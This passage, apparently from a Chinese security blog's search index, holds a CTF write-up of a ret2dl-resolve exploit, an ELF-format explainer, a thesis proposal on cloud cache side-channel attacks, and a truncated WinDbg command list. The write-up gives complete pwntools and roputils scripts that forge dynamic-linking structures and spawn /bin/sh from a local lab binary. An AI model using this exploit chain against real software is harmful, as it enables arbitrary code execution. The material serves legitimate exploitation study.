# fake write relocation r_info = (index_dynsym &lt;&lt; 8) | 0x7 fake_write_reloc = flat([elf.got['write'], r_info]) # fake reloc = base_stage + 24 index_offset = base_stage + 24 - rel_plt   # args in dl_reslove rop.raw(plt0) rop.raw(index_offset) # fake ret of write rop.raw(0xdeadbeef) rop.raw(1) rop.raw(base_stage + 80) rop.raw(len(sh)) # fake reloc (offset 4*6=24) rop.raw(fake_write_reloc) # padding rop.raw('a' * align) # fake dynsym (align to 0x10) rop.raw(fake_write_sym) rop.raw(rop.generatePadding(0, 80 - len(rop.chain()))) rop.raw(sh) rop.raw(rop.generatePadding(80, 100 - len(rop.chain()))) s.send(rop.chain()) #s.recv()  s.interactive()   STAGE 5   这一阶段，我们将在阶段 4 的基础上，我们进一步使得 write 符号的 st_name 指向我们自己构造的字符串。   rop = ROP(elf) # stack size stack_size = 0x800 base_stage = elf.bss() + stack_size rop.raw(cyclic(112)) rop.read(0, base_stage, 100) # stack pivoting，esp = base_stage rop.migrate(base_stage) s.recv() s.send(rop.chain())  rop = ROP(elf) sh = \"/bin/sh\\x00\" plt0 = elf.get_section_by_name('.plt').header.sh_addr rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr dynsym = elf.get_section_by_name('.dynsym').header.sh_addr dynstr = elf.get_section_by_name('.dynstr').header.sh_addr   # 1. fake index to fake .rel.plt index_offset = base_stage + 24 - rel_plt  # 3. fake .dynsym fake_sym_addr = base_stage + 32 # size of item(Elf32_Symbol) of dynsym is 0x10 align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf)   fake_sym_addr = fake_sym_addr + align  # 4. fake index to fake .dynstr index_dynsym = (fake_sym_addr - dynsym) / 0x10  # 2. fake r_info in .rel.plt to fake .dynsym r_info = (index_dynsym &lt;&lt; 8) | 0x7 fake_write_reloc = flat([elf.got['write'], r_info])  # 5. fake st_name  # 0x10 is the offset of fake_write_sym st_name = fake_sym_addr + 0x10 - dynstr fake_write_sym = flat([st_name, 0, 0, 0x12])   # args in dl_reslove rop.raw(plt0) rop.raw(index_offset) # fake ret of write rop.raw(0xdeadbeef) # write(1, addr, len) rop.raw(1) rop.raw(base_stage + 80) rop.raw(len(sh)) # 1. fake .rel.plt (offset 4*6=24) rop.raw(fake_write_reloc) # padding rop.raw('a' * align) # 2. fake .dynsym (align to 0x10) rop.raw(fake_write_sym) # 3. fake .dynstr rop.raw('write\\x00') rop.raw(rop.generatePadding(0, 80 - len(rop.chain()))) rop.raw(sh) rop.raw(rop.generatePadding(80, 100 - len(rop.chain())))  print rop.dump() s.send(rop.chain()) #s.recv()  s.interactive()   STAGE 6   这一阶段，我们只需要将原先的 write 字符串修改为 system 字符串，同时修改 write 的参数为 system 的参数即可获取 shell。这是因为，dl_resolve 最终依赖的是我们所给定的字符串，即使我们给了一个假的字符串它仍然会去解析并执行。具体代码如下   rop = ROP(elf) # stack size stack_size = 0x800 base_stage = elf.bss() + stack_size rop.raw(cyclic(112)) rop.read(0, base_stage, 100) # stack pivoting，esp = base_stage rop.migrate(base_stage) s.recv() s.send(rop.chain())  rop = ROP(elf) sh = \"/bin/sh\\x00\" plt0 = elf.get_section_by_name('.plt').header.sh_addr rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr dynsym = elf.get_section_by_name('.dynsym').header.sh_addr dynstr = elf.get_section_by_name('.dynstr').header.sh_addr   # 1. fake index to fake .rel.plt index_offset = base_stage + 24 - rel_plt  # 3. fake .dynsym fake_sym_addr = base_stage + 32 # size of item(Elf32_Symbol) of dynsym is 0x10 align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf)   fake_sym_addr = fake_sym_addr + align  # 4. fake index to fake .dynstr index_dynsym = (fake_sym_addr - dynsym) / 0x10  # 2. fake r_info in .rel.plt to fake .dynsym r_info = (index_dynsym &lt;&lt; 8) | 0x7 fake_write_reloc = flat([elf.got['write'], r_info])  # 5. fake st_name  # 0x10 is the offset of fake_write_sym st_name = fake_sym_addr + 0x10 - dynstr fake_write_sym = flat([st_name, 0, 0, 0x12])   # args in dl_reslove rop.raw(plt0) rop.raw(index_offset) # fake ret of write rop.raw(0xdeadbeef) # write(1, addr, len) rop.raw(base_stage + 80) rop.raw('aaaa') rop.raw('bbbb') # 1. fake .rel.plt (offset 4*6=24) rop.raw(fake_write_reloc) # padding rop.raw('a' * align) # 2. fake .dynsym (align to 0x10) rop.raw(fake_write_sym) # 3. fake .dynstr rop.raw('system\\x00\\x00') rop.raw(rop.generatePadding(0, 80 - len(rop.chain()))) rop.raw(sh) rop.raw(rop.generatePadding(80, 100 - len(rop.chain())))  print rop.dump() s.send(rop.chain()) #s.recv()  s.interactive()      漏洞利用方式      控制eip为PLT[0]的地址，只需传递一个index_arg参数   控制index_arg的大小，使reloc的位置落在可控地址内   伪造reloc的内容，使sym落在可控地址内   伪造sym的内容，使name落在可控地址内   伪造name为任意库函数，如system   工具攻击   #!/usr/bin/env python # -*- coding: utf-8 -*- __author__ = 'zjgcjy'  import os import sys sys.path.append('/home/zjgcjy/roputils') from roputils import * from pwn import process, gdb, context  #from LibcSearcher import * #context.arch = elf.arch context.terminal = ['gnome-terminal', '-x', 'sh', '-c']  s = process('./main') context.log_level = 'debug' s.recv()  rop = ROP('./main') offset = 112 bss_base = rop.section('.bss') buf = rop.fill(offset)  buf += rop.call('read', 0, bss_base, 100) ## used to call dl_Resolve() buf += rop.dl_resolve_call(bss_base + 20, bss_base) s.send(buf)  buf = rop.string('/bin/sh') buf += rop.fill(20, buf) ## used to make faking data, such relocation, Symbol, Str buf += rop.dl_resolve_data(bss_base + 20, 'system') buf += rop.fill(100, buf) s.send(buf) s.interactive()  ","categories": [],
        "tags": ["pwn"],
        "url": "https://zjgcjy.github.io/posts/2019-03/Pwnit-5.html",
        "teaser":null},{
        "title": "Elf Structure",
        "excerpt":"   ELF文件格式介绍，来自CTF-wiki      ELF （Executable and Linkable Format）文件，也就是在 Linux 中的目标文件，主要有以下三种类型：      可重定位文件（Relocatable File），包含由编译器生成的代码以及数据。链接器会将它与其它目标文件链接起来从而创建可执行文件或者共享目标文件。在 Linux 系统中，这种文件的后缀一般为 .o 。   可执行文件（Executable File），就是我们通常在 Linux 中执行的程序。   共享目标文件（Shared Object File），包含代码和数据，这种文件是我们所称的库文件，一般以 .so 结尾。一般情况下，它有以下两种使用情景：            链接器（Link eDitor, ld）可能会处理它和其它可重定位文件以及共享目标文件，生成另外一个目标文件。       动态链接器（Dynamic Linker）将它与可执行文件以及其它共享目标组合在一起生成进程镜像。           目标文件既会参与程序链接又会参与程序执行。出于方便性和效率考虑，根据过程的不同，目标文件格式提供了其内容的两种并行视图，如下：      链接视图 文件开始处是 ELF 头部（ ELF Header），它给出了整个文件的组织情况。   如果程序头部表（Program Header Table）存在的话，它会告诉系统如何创建进程。用于生成进程的目标文件必须具有程序头部表，但是重定位文件不需要这个表。   节区部分包含在链接视图中要使用的大部分信息：指令、数据、符号表、重定位信息等等。   节区头部表（Section Header Table）包含了描述文件节区的信息，每个节区在表中都有一个表项，会给出节区名称、节区大小等信息。用于链接的目标文件必须有节区头部表，其它目标文件则无所谓，可以有，也可以没有。   执行视图 对于执行视图来说，其主要的不同点在于没有了 section，而有了多个 segment。其实这里的 segment 大都是来源于链接视图中的 section。   ELF Header   ELF Header 描述了 ELF 文件的概要信息，利用这个数据结构可以索引到 ELF 文件的全部信息，数据结构如下：   #define EI_NIDENT   16 typedef struct {     unsigned char   e_ident[EI_NIDENT];     ELF32_Half      e_type;  标识目标文件类型     ELF32_Half      e_machine;  运行的机器架构     ELF32_Word      e_version;  目标文件的版本     ELF32_Addr      e_entry;     ELF32_Off       e_phoff;  程序头部表在文件中的字节偏移     ELF32_Off       e_shoff;  节区头部表在文件中的字节偏移     ELF32_Word      e_flags;     ELF32_Half      e_ehsize;   ELF文件头的长度     ELF32_Half      e_phentsize;  程序头部表中每个表项的长度     ELF32_Half      e_phnum;  程序头部表的项数     ELF32_Half      e_shentsize;  节区头部表的长度     ELF32_Half      e_shnum;  节区头部表的项数     ELF32_Half      e_shstrndx; } Elf32_Ehdr;   其中每个成员都是 e 开头的，它们应该都是 ELF 的缩写。      Program Header Table   Program Header Table 是一个结构体数组，每一个元素的类型是 Elf32_Phdr，描述了一个段或者其它系统在准备程序执行时所需要的信息。其中，ELF 头中的 e_phentsize 和 e_phnum 指定了该数组每个元素的大小以及元素个数。一个目标文件的段包含一个或者多个节。程序的头部只有对于可执行文件和共享目标文件有意义。所以，Program Header Table 就是专门为 ELF 文件运行时中的段所准备的。 Elf32_Phdr 的数据结构如下：   typedef struct {     ELF32_Word  p_type;  段的类型     ELF32_Off   p_offset;  从文件开始到该段开头的第一个字节的偏移     ELF32_Addr  p_vaddr;  第一个字节在内存中的虚拟地址     ELF32_Addr  p_paddr;     ELF32_Word  p_filesz;  文件镜像中该段的大小     ELF32_Word  p_memsz;  内存镜像中该段的大小     ELF32_Word  p_flags;  段相关的标记     ELF32_Word  p_align; } Elf32_Phdr;      段和节的包含关系：      段内容   一个段可能包括一到多个节区，但是这并不会影响程序的加载。尽管如此，我们也必须需要各种各样的数据来使得程序可以执行以及动态链接等等。下面会给出一般情况下的段的内容。对于不同的段来说，它的节的顺序以及所包含的节的个数有所不同。此外，与处理相关的约束可能会改变对应的段的结构。 代码段只包含只读的指令以及数据。当然这个例子并没有给出所有的可能的段。      数据段包含可写的数据以及以及指令，通常来说，包含以下内容：      程序头部的 PT_DYNAMIC 类型的元素指向指向 .dynamic 节。其中，got 表和 plt 表包含与地址无关的代码相关信息。尽管在这里给出的例子中，plt 节出现在代码段，但是对于不同的处理器来说，可能会有所变动。 .bss 节的类型为 SHT_NOBITS，这表明它在 ELF 文件中不占用空间，但是它却占用可执行文件的内存镜像的空间。通常情况下，没有被初始化的数据在段的尾部，因此，p_memsz 才会比 p_filesz 大。      不同的段来说可能会有所重合，即不同的段包含相同的节。   Section Header Table   该结构用于定位 ELF 文件中的每个节区的具体位置。 首先，ELF 头中的 e_shoff 项给出了从文件开头到节头表位置的字节偏移。e_shnum 告诉了我们节头表包含的项数；e_shentsize 给出了每一项的字节大小。   其次，节头表是一个数组，每个数组的元素的类型是 ELF32_Shdr ，每一个元素都描述了一个节区的概要内容。   typedef struct {  Elf32_Word sh_name;      // 节头部字符串表节区的索引  Elf32_Word sh_type;      // 节类型  Elf32_Word sh_flags;     // 节标志，用于描述属性  Elf32_Addr sh_addr;      // 节的内存映像  Elf32_Off  sh_offset;    // 节的文件偏移  Elf32_Word sh_size;      // 节的长度  Elf32_Word sh_link;      // 节头部表索引链接  Elf32_Word sh_info;      // 附加信息  Elf32_Word sh_addralign; // 节对齐约束  Elf32_Word sh_entsize;   // 固定大小的节表项的长度 } Elf32_Shdr;      Sections   节区包含目标文件中除了 ELF 头部、程序头部表、节区头部表的所有信息。节区满足以下条件      每个节区都有对应的节头来描述它。但是反过来，节区头部并不一定会对应着一个节区。   每个节区在目标文件中是连续的，但是大小可能为 0。   任意两个节区不能重叠，即一个字节不能同时存在于两个节区中。   目标文件中可能会有闲置空间（inactive space），各种头和节不一定会覆盖到目标文件中的所有字节，闲置区域的内容未指定。   许多在 ELF 文件中的节都是预定义的，它们包含程序和控制信息。这些节被操作系统使用，但是对于不同的操作系统，同一节区可能会有不同的类型以及属性。   可执行文件是由链接器将一些单独的目标文件以及库文件链接起来而得到的。其中，链接器会解析引用（不同文件中的子例程的引用以及数据的引用，调整对象文件中的绝对引用）并且重定位指令。加载与链接过程需要目标文件中的信息，并且会将处理后的信息存储在一些特定的节区中，比如 .dynamic 。   .strtab: String Table   该节区描述默认的字符串表，包含了一系列的以 NULL 结尾的字符串。ELF 文件使用这些字符串来存储程序中的符号名，包括      变量名   函数名   该节在运行的过程中不需要加载，只需要加载对应的子集 .dynstr 节。   一般通过对字符串的首个字母在字符串表中的下标来索引字符串。   字符串表的首尾字节都是 NULL。此外，索引为 0 的字符串要么没有名字，要么就是名字为空，其解释依赖于上下文。字符串表也可以为空，相应的，其节区头部的 sh_size 成员将为 0。在空字符串表中索引大于 0 的下标显然是非法的。   一个节区头部的 sh_name 成员的值为其相应的节区头部字符串表节区的索引，此节区由 ELF 头的 e_shstrndx 成员给出。   .shstrtab: Section Header String Table   该节区与 .strtab 的存储结构类似，不过该节区存储的是节区名的字符串。   .symtab: Symbol Table   每个目标文件都会有一个符号表，熟悉编译原理的就会知道，在编译程序时，必须有相应的结构来管理程序中的符号以便于对函数和变量进行重定位。   此外，链接本质就是把多个不同的目标文件相互 “粘” 在一起，实际上，目标文件相互粘合是目标文件之间对地址的引用，即函数和变量的地址的相互引用。而在粘合的过程中，符号就是其中的粘合剂。   目标文件中的符号表包含了一些通用的符号，这部分信息在进行了 strip 操作后就会消失。包括      变量名   函数名   符号表其实是一个数组，数组中的每一个元素都是一个结构体，具体如下   typedef struct {     Elf32_Word      st_name;  符号在字符串表中对应的索引     Elf32_Addr      st_value;     Elf32_Word      st_size;  符号所占用的大小     unsigned char   st_info;     unsigned char   st_other;     Elf32_Half      st_shndx; } Elf32_Sym;      如何定位   那么对于一个符号来说如何定位其对应字符串的地址呢？具体步骤如下      根据 Section Header Table 中符号节头中的 sh_link 获取该符号节中对应符号字符串节在 Section Header Table 中的下标。进而我们就可以获取对应符号节的地址。   根据该符号的定义中的 st_name 获取该符号的偏移，即在对应符号节中的偏移。   根据上述两者就可以定位一个符号对应的字符串的地址了。   Data Related Sections   BSS Section   未初始化的全局变量对应的节。此节区不占用 ELF 文件空间，但占用程序的内存映像中的空间。当程序开始执行时，系统将把这些数据初始化为 0。bss 其实是 block started by symbol 的简写，说明该节区中单纯地说明了有哪些变量。   .data Section   这些节区包含初始化了的数据，会在程序的内存映像中出现。   .rodata Section   这些节区包含只读数据，这些数据通常参与进程映像的不可写段。   Common Code Section   .init &amp; .init_array   此节区包含可执行指令，是进程初始化代码的一部分。程序开始执行时，系统会在开始调用主程序入口（通常指 C 语言的 main 函数）前执行这些代码。   .text   此节区包含程序的可执行指令。   .fini &amp; .fini_array   此节区包含可执行的指令，是进程终止代码的一部分。程序正常退出时，系统将执行这里的代码。   Dynamic Related Sections   .dynamic   如果一个目标文件参与到动态链接的过程中，那么它的程序头部表将会包含一个类型为 PT_DYNAMIC 的元素。这个段包含了 .dynamic 节，其实这个段就是一个单纯的键值对。 动态节一般保存了 ELF 文件的如下信息      依赖于哪些动态库   动态符号节信息   动态字符串节信息   我们一般使用_DYNAMIC符号来标记这个节，它的结构如下   typedef struct {     Elf32_Sword     d_tag;     union {         Elf32_Word  d_val;         Elf32_Addr  d_ptr;     } d_un; } Elf32_Dyn; extern Elf32_Dyn_DYNAMIC[];   其中，d_tag 的取值决定了该如何解释 d_un。      d_val            这个字段表示一个整数值，可以有多种意思。           d_ptr            这个字段表示程序的虚拟地址。正如之前所说的，一个文件的虚拟地址在执行的过程中可能和内存的虚拟地址不匹配。当解析动态结构中的地址时，动态链接器会根据原始文件的值以及内存的基地址来计算真正的地址。为了保持一致性，文件中并不会包含重定位入口来 “纠正” 动态结构中的地址。              .dynsym   动态链接的 ELF 文件具有专门的动态符号表，其使用的结构就是 Elf32_Sym，但是其存储的节为 .dynsym。这里再次给出 Elf32_Sym 的结构   typedef struct {   Elf32_Word    st_name;   /* Symbol name (string tbl index) */   Elf32_Addr    st_value;  /* Symbol value */   Elf32_Word    st_size;   /* Symbol size */   unsigned char st_info;   /* Symbol type and binding */   unsigned char st_other;  /* Symbol visibility under glibc&gt;=2.2 */   Elf32_Section st_shndx;  /* Section index */ } Elf32_Sym;   需要注意的是 .dynsym 是运行时所需的，ELF 文件中 export/import 的符号信息全在这里。但是，.symtab 节中存储的信息是编译时的符号信息，它们在 strip 之后会被删除掉。   我们主要关注动态符号中的两个成员      st_name， 该成员保存着动态符号在 .dynstr 表（动态字符串表）中的偏移。   st_value，如果这个符号被导出，这个符号保存着对应的虚拟地址。   动态符号与指向它的 Elf_Verdef 保存在 .gnu.version 段中，其中，由 Elf_Verneed 结构体构成的数组的每个元素对应动态符号表的一项。其实，这个结构体就只有一个域：那就是一个 16 位的整数，表示 gnu.verion_r 段中的下标。   在这样的情况下，动态链接器使用 Elf_Rel 结构体成员 r_info 中的下标同时作为 .dynsym 段和 gnu.version 段的下标。这样就可以一一对应到每一个符号到底是那个版本的了。      Relocation Related Sections   链接器在处理目标文件时，需要对目标文件中的某些位置进行重定位，即将符号指向恰当的位置，确保程序正常执行。例如，当程序调用了一个函数时，相关的调用指令必须把控制流交给适当的目标执行地址。   在 ELF 文件中，对于每一个需要重定位的 ELF 节都有对应的重定位表，比如说 .text 节如果需要重定位，那么其对应的重定位表为 .rel.text。   举个例子，当一个程序导入某个函数时，.dynstr 就会包含对应函数名称的字符串，.dynsym 中就会包含一个具有相应名称的动态字符串表的符号（Elf_Sym），在 rel.dyn 中就会包含一个指向这个符号的的重定位表项。   .rel(a).dyn &amp; .rel(a).plt   .rel.dyn 包含了动态链接的二进制文件中需要重定位的变量的信息，这些信息在加载的时候必须完全确定。而 .rel.plt 包含了需要重定位的函数的信息。这两类重定位节都使用如下的结构 .rel.plt节是用于函数重定位，.rel.dyn节是用于变量重定位   typedef struct { Elf32_Addr r_offset; // 对于可执行文件，此值为虚拟地址 Elf32_Word r_info; // 符号表索引 } Elf32_Rel;  #define ELF32_R_SYM(info) ((info)&gt;&gt;8) #define ELF32_R_TYPE(info) ((unsigned char)(info)) #define ELF32_R_INFO(sym, type) (((sym)&lt;&lt;8)+(unsigned char)(type))   Elf32_Rela 类型的表项包含明确的补齐信息。 Elf32_Rel 类型的表项在将被修改的位置保存隐式的补齐信息。由于处理器体系结构的原因，这两种形式都存在，甚至是必需的。      Global Offset Table   GOT 表在 ELF 文件中分为两个部分      .got，保存全局变量偏移表   .got.plt，保存全局函数偏移表，对应着Elf32_Rel结构中r_offset的值。   其相应的值由能够解析. rel.plt 段中的重定位的动态链接器来填写。   通常来说，地址独立代码不能包含绝对虚拟地址。GOT 表中包含了隐藏的绝对地址，这使得在不违背位置无关性以及程序代码段兼容的情况下，得到相关符号的绝对地址。一个程序可以使用位置独立代码来引用它的 GOT 表，然后提取出来绝对的数值，以便于将位置独立的引用重定向到绝对的地址。 这个表对于 System V 环境中的动态链接来说是必要的，但其具体的内容以及形式依赖于处理器。   初始时，got 表中包含重定向入口所需要的信息。当一个系统为可加载的目标文件创建内存段时，动态链接器会处理重定位项，其中的一些项的类型可能是 R_386_GLOB_DAT，这会指向 got 表。动态链接器会决定相关的符号的值，计算它们的绝对地址，然后将合适的内存表项设置为相应的值。尽管在链接器建立目标文件时，绝对地址还处于未知状态，动态链接器知道所有内存段的地址，因为可以计算所包含的符号的绝对地址。   如果一个程序需要直接访问一个符号的绝对地址，那么这个符号将会有一个 got 表项。由于可执行文件以及共享目标文件都有单独的表项，所以一个符号的地址可能会出现在多个表中。动态链接器在把权限给到进程镜像中的代码段前，会处理所有的 got 表中的重定位项，以便于确定所有的绝对地址在执行过程中是可以访问的。   GOT 表中的第 0 项包含动态结构的地址，用符号 _DYNAMIC 来进行引用。这使得一个程序，例如动态链接器，在没有执行其重定向前可以找到对应的动态结构。这对于动态链接器来说是非常重要的，因为它必须在不依赖其它程序的情况下可以重定位自己的内存镜像。   在不同的程序中，系统可能会为同一共享目标文件选择不同的内存段地址；甚至对于同一个程序，在不同的执行过程中，也会有不同的库地址。然而，一旦进程镜像被建立，内存段的地址就不会再改变，只要一个进程还存在，它的内存段地址将处于固定的位置。   GOT 表的形式以及解释依赖于具体的处理器，对于 Intel 架构来说，_GLOBAL_OFFSET_TABLE_ 符号可能被用来访问这个表。   extern Elf32_Addr _GLOBAL_OFFSET_TABLE[];   GLOBAL_OFFSET_TABLE 可能会在 .got 节的中间，以便于可以使用正负索引来访问这个表。   在 Linux 的实现中，.got.plt 的前三项的具体的含义如下      GOT[0]，.dynamic 的地址。   GOT[1]，指向内部类型为 link_map 的指针，只会在动态装载器中使用，包含了进行符号解析需要的当前 ELF 对象的信息。每个 link_map 都是一条双向链表的一个节点，而这个链表保存了所有加载的 ELF 对象的信息。   GOT[2]，指向动态装载器中 _dl_runtime_resolve 函数的指针。   .got.plt 后面的项则是程序中不同 .so 中函数的引用地址。下面给出一个相应的关系。         Procedure Linkage Table   GOT 表用来将位置独立的地址重定向为绝对地址，与此类似，PLT 表将位置独立的函数重定向到绝对地址。主要包括两部分      .plt，与常见导入的函数有关，如 read 等函数。   .plt.got，与动态链接有关系。   在动态链接下，程序模块之间包含了大量的函数引用，程序开始执行前，动态链接会耗费不少时间用于解决模块之间的函数引用的符号查找以及重定位。但是，在一个程序运行过程中，可能很多函数在程序执行完时都不会用到，因此一开始就把所有函数都链接好是一种浪费，所以 ELF 采用了一种延迟绑定的做法，其基本思想是函数第一次被用到时才进行绑定（符号查找，重定位等），如果没有用则不进行绑定。所以程序开始执行前，模块间的函数调用都没有进行绑定，而是需要用到时才由动态链接器负责绑定。   链接编辑器不能够解析执行流转换（比如程序调用），即从一个可执行文件或者共享目标文件到另一个文件。链接器安排程序将控制权交给过程链接表中的表项。在 Intel 架构中，过程链接表存在于共享代码段中，但是他们会使用在 GOT 表中的数据。动态链接器会决定目标的绝对地址，并且会修改相应的 GOT 表中的内存镜像。因此，动态链接器可以在不违背位置独立以及程序代码段兼容的情况下，重定向 PLT 项。可执行文件和共享目标文件都有独立的 PLT 表。   动态链接器和程序按照如下方式解析过程链接表和全局偏移表的符号引用。      当第一次建立程序的内存镜像时，动态链接器将全局偏移表的第二个和第三个项设置为特殊的值，下面的步骤会仔细解释这些数值。   如果过程链接表是位置独立的话，那么 GOT 表的地址必须在 ebx 寄存器中。每一个进程镜像中的共享目标文件都有独立的 PLT 表，并且程序只在同一个目标文件将控制流交给 PLT 表项。因此，调用函数负责在调用 PLT 表项之前，将全局偏移表的基地址设置为寄存器中。   这里举个例子，假设程序调用了 name1，它将控制权交给了 lable .PLT1。   那么，第一条指令将会跳转到全局偏移表中 name1 的地址。初始时，全局偏移表中包含 PLT 中下一条 pushl 指令的地址，并不是 name1 的实际地址。   因此，程序将一个重定向偏移（reloc_index）压到栈上。重定位偏移是 32 位的，并且是非负的数值。此外，重定位表项的类型为 R_386_JMP_SLOT，并且它将会说明在之前 jmp 指令中使用的全局偏移表项在 GOT 表中的偏移。重定位表项也包含了一个符号表索引，因此告诉动态链接器什么符号目前正在被引用。在这个例子中，就是 name1 了。   在压入重定位偏移后，程序会跳转到 .PLT0，这是过程链接表的第一个表项。pushl 指令将 GOT 表的第二个表项 (got_plus_4 或者 4(%ebx)，当前 ELF 对象的信息) 压到栈上，然后给动态链接器一个识别信息。此后，程序会跳转到第三个全局偏移表项 (got_plus_8 或者 8(%ebx)，指向动态装载器中_dl_runtime_resolve 函数的指针) 处，这将会将程序流交给动态链接器。   当动态链接器接收到控制权后，他将会进行出栈操作，查看重定位表项，找到对应的符号的值，将 name1 的地址存储在全局偏移表项中，然后将控制权交给目的地址。   过程链接表执行之后，程序的控制权将会直接交给 name1 函数，而且此后再也不会调用动态链接器来解析这个函数。也就是说，在 .PLT1 处的 jmp 指令将会直接跳转到 name1 处，而不是再次执行 pushl 指令。      ","categories": [],
        "tags": ["elf"],
        "url": "https://zjgcjy.github.io/posts/2019-03/ELF-structure.html",
        "teaser":null},{
        "title": "毕设开题",
        "excerpt":"   毕业要紧＞﹏＜ 基于侧信道攻击的云系统加解密软件漏洞挖掘      一、选题背景、意义及国内外研究现状：   随着互联网技术的发展，云计算的观念已经深入人心，也为我们的生活提供了便捷，已成为当前主流的计算模式，在服务器应用、大数据处理、数据中心领域中得到广泛应用。而云计算的核心思想是通过互联网来提供动态、易拓展的虚拟化资源。使用虚拟化技术能将高性能物理机虚拟成若干并行运行的逻辑计算机，这种方式显著提高了计算机的工作效率，也成就了云计算超强的计算能力。   但虚拟化技术也面临着严重的安全风险，虚拟化的复杂性导致曾经看似简单的安全问题变得复杂，安全问题难以处理，除此以外，包括虚拟机信息窃取和篡改、虚拟机逃逸、Rootkit攻击、侧信道攻击等新安全威胁，也是虚拟化技术所要面临的问题。而侧信道攻击作为一种非常规的攻击方式，因为能简单有效的绕过正面的防御，在近些年得到了国内外安全研究人员的广泛关注。由于虚拟化的作用，逻辑并行的虚拟机之间将在物理层多核之间存在cache数据共享，但cache命中率和失效所对应的响应时间有差别，攻击者可以通过访问时间的差异，推测cache中的信息，从而获得隐私数据，可以进一步做其他攻击。   近几年通过测信道来进行漏洞挖掘的也越来越多，通过电磁分析、能耗分析、时间分析等方式，来获取程序或系统运行期间的关键信息，就能突破安全防护机制的保护。2016年，就有人使用SPA(简单功耗分析攻击)攻击了一个智能保险箱。侧信道攻击对于这种运算单一、时钟频率低的设备中的加密攻击是很有效的。2018年1月，Project Zero安全团队披露出Intel等处理器芯片存在非常严重的安全漏洞，利用了芯片硬件层面执行加速机制的实现缺陷实现侧信道攻击，可以间接通过CPU缓存读取系统内存数据。这就是著名的Meltdown（熔断）与Spectre（幽灵）CPU漏洞。CVE编号为CVE-2017-5754、 CVE-2017-5753和 CVE-2017-5715等。该漏洞的原理就是利用了测信道攻击，对指令执行期间的分支预测机制进行定时攻击。   二、主要内容、研究方法及拟要解决的问题：   本课题将系统地研究云计算系统中测信道攻击，分析云计算条件下常见的测信道攻击方式，研究云系统中内存、CPU缓存的组成和架构，并对其建模，分析云环境下的安全问题，同时进行漏洞挖掘的相关工作，设计针对密码算法的程序分析和漏洞挖掘框架，改进基于侧信道的漏洞挖掘工具。   本课题准备采用的研究方法主要是查阅文献和阅读文档，由于硬件设备条件的限制，本课题主要将从理论角度分析、发现、解决遇到的困难。同时基于先前的研究成果，改进漏洞挖掘分析工具。   本课题需要解决的问题主要是分析侧信道攻击的成因以及漏洞挖掘的思路，这需要根据前期掌握的知识进行创新和突破。针对该问题，我准备阅读大量文献并尝试提出自己的想法并应用。   三、进度安排：   2019.1.4-2019.2.15查阅相关文献，掌握云系统的组成、架构等相关资料，同时了解常见的测信道攻击方式。   2019.2.16-2019.3.15对cache结构进行分析讨论，归纳总结其在加解密算法中的应用，寻找具有其特征的漏洞成因和相应的挖掘方式。   2019.3.16-2019.4.15 根据相关资料，学习符号执行或其他程序分析和漏洞挖掘方法。   2019.4.16-2019.5.15根据实验思路编程测试，对常见密码算法进行检测并总结其正确性。   2019.5.16-2019.5.30撰写毕业论文。   四、参考文献：   [1]  梁鑫,桂小林,戴慧珺,张晨.云环境中跨虚拟机的Cache侧信道攻击技术研究.计算机学报,2017.40(2):317-336   [2]  孔云生,基于cache的边信道攻击可行性分析符号执行系统的设计与实现[工程硕士学位论文].哈尔滨:哈尔滨工业大学,2015   [3]  王丽娜,章鑫余,荣威,徐来,徐一波,曾强.云环境下基于内存总线的侧信道攻击检测方法.武汉大学学报,2016.62(5):418-424  ","categories": [],
        "tags": ["毕设"],
        "url": "https://zjgcjy.github.io/posts/2019-03/%E6%AF%95%E8%AE%BE%E5%BC%80%E9%A2%98.html",
        "teaser":null},{
        "title": "Windbg",
        "excerpt":"   windbg手册      查看变量   dv Display Variable的缩写, 查看局部变量. dv /i 查看局部变量, 并显示符号的类型和参数类型. dv /V 查看局部变量, 并显示变量的存储位置. dv /V VariableName 指定需要查看的变量的名字 dv 02sample!gGlo*  dv命令可以带有通配符, 来查看具有某命名模式的变量.   dt Display Type的缩写. 当变量的类型为复合类型, 比如说结构体或者类, 那么dv命令只会显示变量的地址. dt命令可以将一块内存按照某个数据类型来解析, 其中的数据类型需要作为参数被传递给dt命令. dt KBTest 0x000cff0c 将某内存地址按照某类型来解释并显示. dt 02sample!gGlobal dt命令在显示内存块时, 解析对象的类型.   断点   WinDBG 提供了多种设断点的命令：bp, bu, bm, ba. bp 命令是在某个地址下断点， 可以 bp 0x7783FEB也可以 bp MyApp!SomeFunction 。 对于后者，WinDBG 会自动找到MyApp!SomeFunction 对应的地址并设置断点。 但是使用bp的问题在于：1）当代码修改之后，函数地址改变，该断点仍然保持在相同位置，不一定继续有效； 2）WinDBG 不会把bp断点保存工作空间中 。所以，我比较喜欢用bu 命令。   bu命令是针对某个符号下断点。 比如 bu MyApp!SomeFunction 。 在代码被修改之后， 该断点可以随着函数地址改变而自动更新到最新位置。  而且bu 断点会保存在WinDbg工作空间中， 下次启动 Windbg 的时候该断点会自动设置上去。另外，在模块没有被加载的时候，bp 断点会失败（因为函数地址不存在），而bu 断点则可以成功。 新版的WinDBG中 bp失败后会自动被转成bu 。   bm 命令也是针对符号下断点。 但是它支持匹配表达式。 很多时候你下好几个断点。 比如，把MyClass 所有的成员函数都下断点： bu MyApp!MyClass::*， 或者把所有以CreateWindow开头的函数都下断点：bu user32!CreateWindow* 。   以上三个命令是对代码下断点， 我们还可以对数据下断点。 ba命令就是针对数据下断点的命令， 该断点在指定内存被访问时触发。 命令格式为 ba Access Size [地址] Access 是访问的方式， 比如 e (执行)， r (读/写)， w (写) Size 是监控访问的位置的大小，以字节为单位。 值为 1、2或4，还可以是 8（64位机）。   比如要对内存0x0483DFE进行写操作的时候下断点，可以用命令 ba w4 0x0483DFE   其他断点命令: bl  列出所有断点 bc  清除断点 bd 禁用断点 be 启动被bd 命令经用的断点   符号   ld ModuleName  加载指定模块的符号 ld *                  加载所有模块的符号 !sym                获取符号加载状态 !sym noisy       让调试器显示符号搜索详细信息 !sym quiet        默认项，不显示符号搜索信息 .sympath         显示和设置符号搜索路径 .sympath+       增加符号搜索路径 .sympath+ C:\\Symbols .symopt            显示当前符号可选项 .symopt+ Flags  添加符号可选项 .symopt- Flags   移除符号可选项 .symfix                           设置符号库路径 .sym+ DownstreamStore  添加符号库路径 x [Options] Module!Symbol    模式匹配符号信息 x /t ..            根据数据类型匹配 x /v ..            显示详细信息 x /a ..            按照地址排序 x /n ..            